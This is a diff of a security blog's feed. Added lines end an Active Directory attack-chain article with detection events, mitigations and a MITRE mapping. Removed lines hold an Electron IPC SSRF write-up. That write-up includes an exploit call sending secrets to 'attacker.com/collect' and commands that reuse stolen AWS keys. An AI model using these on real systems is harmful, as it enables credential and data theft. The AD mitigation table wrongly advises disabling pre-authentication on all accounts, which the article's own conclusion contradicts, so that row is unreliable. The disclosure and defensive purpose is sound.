+<p>The most effective detection of pass-the-hash attacks involves monitoring for <strong>Logon Type 3</strong> (network logon) events from NTLM where the source workstation is not the expected management host for that target.</p>
+<h3>Mitigation</h3>
+<ol>
+<li><strong>Enable Credential Guard</strong> — isolates NTLM hashes in a virtualized secure enclave, preventing extraction even from an elevated process.</li>
+<li><strong>Restrict WinRM access</strong> — configure WinRM firewall rules and <code>TrustedHosts</code> to accept connections only from designated management hosts.</li>
+<li><strong>Disable NTLM where possible</strong> — configure the domain to use Kerberos only (though legacy compatibility often prevents this).</li>
+<li><strong>Implement Privileged Access Workstations (PAWs)</strong> — administrative actions must originate from dedicated, hardened workstations.</li>
+<li><strong>Use Just Enough Administration (JEA)</strong> — limit the commands available to administrative sessions.</li>
+</ol>
+<h2>Detection Opportunities Summary</h2>
+<p>The following table maps each attack phase to relevant Windows security events:</p>
+<table>
+<thead>
+<tr>
+<th>Attack Phase</th>
+<th>Event ID</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kerberos User Enumeration</td>
+<td>4768</td>
+<td>Multiple TGT requests with KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN</td>
+</tr>
+<tr>
+<td>AS-REP Roasting</td>
+<td>4768</td>
+<td>TGT request for account with pre-auth disabled</td>
+</tr>
+<tr>
+<td>SMB Share Access</td>
+<td>5140</td>
+<td>Access to non-standard SMB share</td>
+</tr>
+<tr>
+<td>DCSync</td>
+<td>4662</td>
+<td>Access to domain root with Replicating Directory Changes</td>
+</tr>
+<tr>
+<td>DCSync</td>
+<td>4928/4929</td>
+<td>Replication from non-DC source</td>
+</tr>
+<tr>
+<td>Pass-the-Hash</td>
+<td>4624</td>
+<td>Network logon (Type 3) using NTLM from unexpected source</td>
+</tr>
+</tbody>
+</table>
+<h2>MITRE ATT&amp;CK Mapping</h2>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>ID</th>
+<th>Tactic</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Active Scanning</td>
+<td>T1595.001</td>
+<td>Reconnaissance</td>
+</tr>
+<tr>
+<td>Domain Account Discovery</td>
+<td>T1087.002</td>
+<td>Discovery</td>
+</tr>
+<tr>
+<td>Valid Accounts</td>
+<td>T1078</td>
+<td>Initial Access</td>
+</tr>
+<tr>
+<td>Kerberoasting / AS-REP Roasting</td>
+<td>T1558.003</td>
+<td>Credential Access</td>
+</tr>
+<tr>
+<td>SMB/Windows Admin Shares</td>
+<td>T1021.002</td>
+<td>Lateral Movement</td>
+</tr>
+<tr>
+<td>OS Credential Dumping: DCSync</td>
+<td>T1003.006</td>
+<td>Credential Access</td>
+</tr>
+<tr>
+<td>Pass-the-Hash</td>
+<td>T1550.002</td>
+<td>Lateral Movement / Defense Evasion</td>
+</tr>
+<tr>
+<td>Remote Services: WinRM</td>
+<td>T1021.006</td>
+<td>Lateral Movement</td>
+</tr>
+<tr>
+<td>Use Alternate Authentication Material</td>
+<td>T1550</td>
+<td>Lateral Movement</td>
+</tr>
+</tbody>
+</table>
+<h2>Mitigation Summary</h2>
+<table>
+<thead>
+<tr>
+<th>Attack Phase</th>
+<th>Primary Mitigation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User Enumeration</td>
+<td>Restrict port 88/TCP access; monitor anomalous TGT request volume</td>
+</tr>
+<tr>
+<td>AS-REP Roasting</td>
+<td>Disable pre-authentication on all accounts; enforce strong passwords</td>
+</tr>
+<tr>
+<td>SMB Enumeration</td>
+<td>Least-privilege share permissions; never store credentials in accessible shares</td>
+</tr>
+<tr>
+<td>DCSync</td>
+<td>Remove replication permissions from non-DC accounts; audit domain root ACLs</td>
+</tr>
+<tr>
+<td>Pass-the-Hash</td>
+<td>Enable Credential Guard; restrict WinRM; phase out NTLM</td>
+</tr>
+</tbody>
+</table>
+<h2>Conclusion</h2>
+<p>This attack chain demonstrates a common but devastating path to full Active Directory compromise that relies on only a handful of misconfigurations:</p>
+<ol>
+<li><strong>A service account with pre-authentication disabled and a weak password</strong> yields the first credential pair through AS-REP roasting.</li>
+<li><strong>Credentials stored in a readable network share</strong> provides elevation to a privileged backup account.</li>
+<li><strong>Excessive replication permissions on the backup account</strong> enables a DCSync attack, dumping all domain password hashes.</li>
+<li><strong>NTLM pass-the-hash against WinRM</strong> provides immediate Domain Administrator access.</li>
+</ol>
+<p>Each of these misconfigurations is individually preventable. The combination, however, creates a kill chain that no single defense can stop. Effective AD security requires a layered approach: strong authentication policies, least-privilege delegation, credential hygiene, and continuous monitoring for the specific behavioral signals outlined in this article.</p>
+<p>The most critical takeaway is this: <strong>DCSync is the crown jewel</strong>. If an attacker reaches this phase, game-over is inevitable. Protecting replication permissions — combined with enabling Credential Guard to prevent hash extraction even from elevated contexts — provides the highest return on defensive investment.</p>
+<h2>References</h2>
+<ul>
+<li>Impacket: <a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></li>
+<li>Kerbrute: <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></li>
+<li>NetExec (formerly CrackMapExec): <a href="https://github.com/Pennyw0rth/NetExec">https://github.com/Pennyw0rth/NetExec</a></li>
+<li>MITRE ATT&amp;CK: <a href="https://attack.mitre.org">https://attack.mitre.org</a></li>
+<li>Microsoft Security Event 4662: <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662">https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662</a></li>
+<li>MS-DRSR Protocol: <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/</a></li>
+</ul>
+<p> </p>
+<p> </p>
+<h1>EFO</h1>
+<p><!-- notionvc: 830f26df-97b9-4a46-a1c7-ef5220f64e46 --></p>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title> CVE-2026-55061 </title>
         <author>
@@ -754,230 +1257,6 @@ daemon:x:2:2:daemon:/sbin:/sbin/nologin
 <h2 dir="ltr">Credits</h2>
 <p dir="ltr"><strong>Reporter:</strong> rootcrypt</p>
 <p dir="ltr"><strong>Remediation:</strong> 0x5t4l1n (w4nn4d13)</p>
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>Insecure IPC Channel Allows Sensitive System Data Exfiltration to Arbitrary External Endpoints</title>
-        <author>
-            <name>w4nn4d13</name>
-        </author>
-        <link href="https://w4nn4d13.tech/insecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints/"/>
-        <id>https://w4nn4d13.tech/insecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints/</id>
-            <category term="Security Research"/>
-            <category term="Desktop Application"/>
-            <category term="Application Security"/>
-
-        <updated>2026-06-13T15:10:12+05:30</updated>
-            <summary type="html">
-                <![CDATA[
-                    Electron IPC SSRF — Security Research Summary What Is This Bug? Electron apps are split into two parts: They talk via IPC (Inter-Process Communication). The bug: The main process let the renderer decide where to send sensitive data — with zero validation. // ❌ INSECURE&hellip;
-                ]]>
-            </summary>
-        <content type="html">
-            <![CDATA[
-                <h1><figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/8/ChatGPT-Image-Jun-27-2026-11_07_07-PM.png" alt="" width="1536" height="1024" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/8/responsive/ChatGPT-Image-Jun-27-2026-11_07_07-PM-xs.png 640w ,https://w4nn4d13.tech/media/posts/8/responsive/ChatGPT-Image-Jun-27-2026-11_07_07-PM-sm.png 768w ,https://w4nn4d13.tech/media/posts/8/responsive/ChatGPT-Image-Jun-27-2026-11_07_07-PM-md.png 1024w ,https://w4nn4d13.tech/media/posts/8/responsive/ChatGPT-Image-Jun-27-2026-11_07_07-PM-lg.png 1366w ,https://w4nn4d13.tech/media/posts/8/responsive/ChatGPT-Image-Jun-27-2026-11_07_07-PM-xl.png 1600w ,https://w4nn4d13.tech/media/posts/8/responsive/ChatGPT-Image-Jun-27-2026-11_07_07-PM-2xl.png 1920w"></figure>Electron IPC SSRF — Security Research Summary</h1>
-<h2>What Is This Bug?</h2>
-<p>Electron apps are split into two parts:</p>
-<ul>
-<li><strong>Renderer</strong> — the UI layer (like a browser tab). Limited permissions. Untrusted.</li>
-<li><strong>Main Process</strong> — the engine. Full OS access. Can read files, run commands, make network requests.</li>
-</ul>
-<p>They talk via <strong>IPC (Inter-Process Communication)</strong>.</p>
-<p><strong>The bug:</strong> The main process let the renderer decide <em>where</em> to send sensitive data — with zero validation.</p>
-<hr>
-<h2>The Vulnerable Code</h2>
-<pre><code class="language-js">// ❌ INSECURE — main.js
-ipcMain.handle('upload-diagnostics', async (event, params) =&gt; {
-
-  const destination = params.destination; // ← Comes from renderer. Never validated!
-
-  const data = {
-    environment: process.env,            // API keys, secrets, tokens
-    networkInterfaces: os.networkInterfaces(),
-    processList: execSync('ps aux').toString(),
-    systemLogs: execSync('journalctl -n 100').toString(),
-  };
-
-  await uploadArchive(data, destination); // Sends everything to attacker's URL
-});
-</code></pre>
-<p><strong>One line. That's the entire bug.</strong></p>
-<hr>
-<h2>Severity</h2>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>CVSS Score</td>
-<td>9.1 (Critical)</td>
-</tr>
-<tr>
-<td>Attack Vector</td>
-<td>Network (via XSS)</td>
-</tr>
-<tr>
-<td>Privileges Required</td>
-<td>None</td>
-</tr>
-<tr>
-<td>User Interaction</td>
-<td>None</td>
-</tr>
-<tr>
-<td>Impact</td>
-<td>Full credential/data exfiltration</td>
-</tr>
-</tbody>
-</table>
-<p><strong>CWEs:</strong> CWE-918 (SSRF), CWE-441 (Unintended Proxy), CWE-20 (Input Validation), CWE-284 (Access Control)</p>
-<hr>
-<h2>How an Attacker Exploits It</h2>
-<h3>Step 1 — Get JS into the Renderer (pick any path)</h3>
-<table>
-<thead>
-<tr>
-<th>Method</th>
-<th>How</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>XSS</td>
-<td>App renders unsanitised HTML from the internet</td>
-</tr>
-<tr>
-<td>Supply chain</td>
-<td>A compromised npm package runs code on import</td>
-</tr>
-<tr>
-<td>MitM</td>
-<td>App loads resources over HTTP; attacker injects a script</td>
-</tr>
-<tr>
-<td>Malicious webview</td>
-<td>App opens external URLs with Node.js enabled</td>
-</tr>
-</tbody>
-</table>
-<h3>Step 2 — Send One IPC Message</h3>
-<pre><code class="language-js">const { ipcRenderer } = require('electron');
-
-ipcRenderer.invoke('upload-diagnostics', {
-  destination: 'https://attacker.com/collect'  // Redirect to attacker's server
-});
-</code></pre>
-<h3>Step 3 — Receive a ZIP With</h3>
-<pre><code>stolen_data/
-├── environment_vars.json   ← AWS keys, GitHub tokens, DB passwords
-├── network_interfaces.json ← IPs, MACs, VPN info
-├── process_list.txt        ← All running processes
-├── system_logs.txt         ← Auth events, errors, activity
-└── user_info.json          ← Username, home dir, shell
-</code></pre>
-<h3>Step 4 — Escalate</h3>
-<pre><code class="language-bash"># Use stolen AWS credentials immediately
-export AWS_ACCESS_KEY_ID=$(cat environment_vars.json | jq -r '.AWS_ACCESS_KEY_ID')
-export AWS_SECRET_ACCESS_KEY=$(cat environment_vars.json | jq -r '.AWS_SECRET_ACCESS_KEY')
-aws s3 ls   # Full cloud access
-</code></pre>
-<hr>
-<h2>Why This Is Hard to Detect</h2>
-<p>The data leaves from a <strong>trusted, legitimate app</strong> — not malware. Firewalls and EDR tools see:</p>
-<pre><code>[Slack / Discord / VS Code] → HTTPS POST → attacker.com
-</code></pre>
-<p>Not a suspicious unknown process. Detection is significantly harder.</p>
-<hr>
-<h2>The Fix</h2>
-<h3>Fix 1 — Hardcode the Destination (Most Important)</h3>
-<pre><code class="language-js">// ✅ SECURE — renderer has zero control over where data goes
-const ENDPOINT = 'https://diagnostics.yourcompany.com/upload';
-
-ipcMain.handle('upload-diagnostics', async (event) =&gt; {
-  const data = await collectDiagnosticData();
-  await uploadData(data, ENDPOINT); // Always the hardcoded URL
-  return { success: true };
-});
-</code></pre>
-<h3>Fix 2 — Validate the Sender</h3>
-<pre><code class="language-js">ipcMain.handle('upload-diagnostics', async (event, params) =&gt; {
-  const senderURL = event.senderFrame.url;
-
-  if (!senderURL.startsWith('file:///')) {
-    throw new Error('Rejected: untrusted IPC sender');
-  }
-  // ...
-});
-</code></pre>
-<h3>Fix 3 — Use contextBridge (Block Direct IPC Access)</h3>
-<pre><code class="language-js">// preload.js — expose only what the renderer needs, nothing more
-const { contextBridge, ipcRenderer } = require('electron');
-
-contextBridge.exposeInMainWorld('electronAPI', {
-  uploadDiagnostics: () =&gt; ipcRenderer.invoke('upload-diagnostics'),
-  // No URL parameter exposed — renderer can't pass one
-});
-</code></pre>
-<h3>Fix 4 — Secure Window Settings</h3>
-<pre><code class="language-js">new BrowserWindow({
-  webPreferences: {
-    contextIsolation: true,   // ✅ Mandatory
-    nodeIntegration: false,   // ✅ Mandatory
-    sandbox: true,            // ✅ Recommended
-    preload: path.join(__dirname, 'preload.js'),
-  }
-});
-</code></pre>
-<h3>Fix 5 — Add a Content Security Policy</h3>
-<pre><code class="language-js">// Blocks injected scripts from executing
-'Content-Security-Policy': "default-src 'self' file:; script-src 'self' file:; object-src 'none'"
-</code></pre>
-<hr>
-<h2>Reconnaissance (For Authorised Testing)</h2>
-<h3>Find IPC Channel Names</h3>
-<pre><code class="language-bash"># Extract app source
-npm install -g asar
-asar extract app.asar ./src/
-
-# Find all IPC handlers
-grep -r "ipcMain.handle\|ipcMain.on" ./src/ --include="*.js"
-</code></pre>
-<h3>Monitor IPC Traffic via DevTools</h3>
-<pre><code class="language-js">// Paste in DevTools console
-const orig = ipcRenderer.invoke.bind(ipcRenderer);
-ipcRenderer.invoke = function(channel, ...args) {
-  console.log('[IPC]', channel, JSON.stringify(args));
-  return orig(channel, ...args);
-};
-</code></pre>
-<hr>
-<h2>Detection Indicators</h2>
-<pre><code class="language-bash"># Suspicious temp files
-find /tmp -name "diagnostics_*.zip"
-
-# Monitor outbound connections from the app
-pid=$(pgrep -f "your-electron-app")
-ss -tp | grep $pid
-
-# macOS
-lsof -i -n -P | grep "your-electron-app"
-</code></pre>
-<hr>
-<h2>Key Takeaways</h2>
-<ol>
-<li><strong>Never let the renderer control where privileged data goes.</strong> It doesn't need to know.</li>
-<li><strong>Every IPC handler = a potential attack surface.</strong> Validate sender + params.</li>
-<li><strong><code>contextIsolation: true</code> + <code>nodeIntegration: false</code> are not optional</strong> — they're baseline.</li>
-<li><strong>A compromised renderer should have limited blast radius.</strong> If it doesn't, your architecture is wrong.</li>
-<li><strong>Security is a design decision, not an afterthought.</strong></li>
-</ol>
-<hr>
-<p><em>For authorised security testing only. Always obtain written permission before testing any application.</em></p>
             ]]>
         </content>
     </entry>
